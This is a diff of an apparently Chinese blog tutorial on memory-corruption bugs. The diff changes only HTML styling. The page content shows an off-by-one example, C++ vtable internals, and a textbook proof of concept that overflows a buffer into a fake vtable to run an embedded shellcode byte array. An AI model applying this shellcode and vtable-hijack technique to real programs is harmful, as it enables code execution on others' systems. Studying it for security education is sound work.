@@ -41,11 +41,11 @@
 <li>for (i=0; i&lt;=max; i++) …</li>
 <li>类似如下代码：</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//vuln.c
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//vuln.c
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">foo</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> arg);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bar</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> arg);
 </span></span><span style="display:flex;"><span>
@@ -81,8 +81,8 @@
 <p>C++的编译器应该是保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证取到虚函数表的有最高的性能——如果有多层继承或是多重继承的情况下）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。</p>
 </blockquote>
 <p>结合如下代码便可以理解其机制：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Base</span> {
@@ -104,7 +104,7 @@
 </span></span><span style="display:flex;"><span>	cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;第一个虚函数入口地址：&#34;</span> <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>((<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>b)) <span style="color:#f92672">&lt;&lt;</span> endl;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Invoke the first virtual function
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pFun <span style="color:#f92672">=</span> (Fun)<span style="color:#f92672">*</span>((<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>b));
+</span></span></span><span style="display:flex;"><span>	pFun <span style="color:#f92672">=</span> (Fun)<span style="color:#f92672">*</span>((<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>b));
 </span></span><span style="display:flex;"><span>	pFun();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
@@ -113,9 +113,9 @@
 <p><img src="cpp-virtual-function-1.png" alt=""></p>
 <p>如果对象实例的内存空间中成员变量发生了溢出，有机会修改对象中的虚表指针或修改虚表中的虚函数指针，那么在程序调用虚函数时就会去执行 shellcode。</p>
 <p>参考《0day 安全：软件漏洞分析技术》书中的例子：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;windows.h&#34;</span><span style="color:#75715e">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;windows.h&#34;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;iostream.h&#34;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> shellcode[]<span style="color:#f92672">=</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span style="color:#e6db74">&#34;</span>
@@ -129,7 +129,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1C\x88\x40\x00</span><span style="color:#e6db74">&#34;</span>;<span style="color:#75715e">//set fake virtual function pointer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>class Failwest
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>public:
@@ -148,14 +148,14 @@
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> p_vtable;
 </span></span><span style="display:flex;"><span>	p_vtable<span style="color:#f92672">=</span>overflow.buf<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
 </span></span><span style="display:flex;"><span>	<span style="color:#75715e">//__asm int 3
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//reset fake virtual table to 0x004088cc
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//the address may need to ajusted via runtime debug
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	p_vtable[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0xCC</span>;
+</span></span></span><span style="display:flex;"><span>	<span style="color:#75715e">//reset fake virtual table to 0x004088cc
+</span></span></span><span style="display:flex;"><span>	<span style="color:#75715e">//the address may need to ajusted via runtime debug
+</span></span></span><span style="display:flex;"><span>	p_vtable[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0xCC</span>;
 </span></span><span style="display:flex;"><span>	p_vtable[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x88</span>;
 </span></span><span style="display:flex;"><span>	p_vtable[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x40</span>;
 </span></span><span style="display:flex;"><span>	p_vtable[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x00</span>;
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">strcpy</span>(overflow.buf,shellcode);<span style="color:#75715e">//set fake virtual function pointer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	p<span style="color:#f92672">=&amp;</span>overflow;
+</span></span></span><span style="display:flex;"><span>	p<span style="color:#f92672">=&amp;</span>overflow;
 </span></span><span style="display:flex;"><span>	p<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>修改虚表指针指向缓冲区 =&gt; 程序按照伪造的指针去寻找虚表 =&gt; 伪造虚函数指针 =&gt; 程序调用虚函数执行 shellcode</p>
